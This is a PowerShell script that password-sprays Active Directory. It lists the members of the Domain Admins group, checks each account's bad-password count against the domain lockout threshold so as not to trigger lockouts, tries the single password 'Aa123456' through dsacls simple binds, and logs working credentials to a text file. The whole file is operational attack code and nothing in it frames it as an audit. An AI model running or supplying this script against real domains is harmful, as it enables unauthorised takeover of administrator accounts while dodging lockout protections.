$Domain = ((cmd /c set u)[-3] -split "=")[-1]
$PDC = ((nltest.exe /dcname:$Domain) -split "\\\\")[1]
$lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1]
$GroupToCheck = "Domain Admins"
$UsersToCheck = (Get-ADGroupMember -Recursive $GroupToCheck).SamAccountName | % {(Get-ADUser -Properties Enabled -Identity $_).Samaccountname}
$password = "Aa123456"
$UsersWithPassFile = 'c:\temp\UsersFound.txt'

if (Test-Path $UsersWithPassFile) { 
    
}

$UsersToCheck | % {
    $badPwdCount = Get-ADObject -SearchBase $((Get-ADUser $_).DistinguishedName) -Filter * -Properties badpwdcount -Server $PDC | Select-Object -ExpandProperty badpwdcount
    if ($badPwdCount -lt $lockoutBadPwdCount - 3) {
        $DoaminAdminLoc = "{0},{1}" -f "CN=domain admins",$(Get-ADDomain).UsersContainer
        $UserUPN = "{0}@{1}" -f $_,$(Get-ADDomain).DNSRoot
        $isInvalid = dsacls.exe $DoaminAdminLoc /user:$UserUPN /passwd:$password /simple| select-string -pattern "Invalid Credentials"
        if ($isInvalid -match "Invalid") {
            Write-Host "[-] Invalid Credentials for $_ : $password" -foreground red
        } else {
            Write-Host "[+] Working Credentials for $_ : $password" -foreground green
            $finding = "User: {0} With Password {1}" -f $_,$password
            Write-Output $finding | tee $UsersWithPassFile -Append
        }        
    }
}
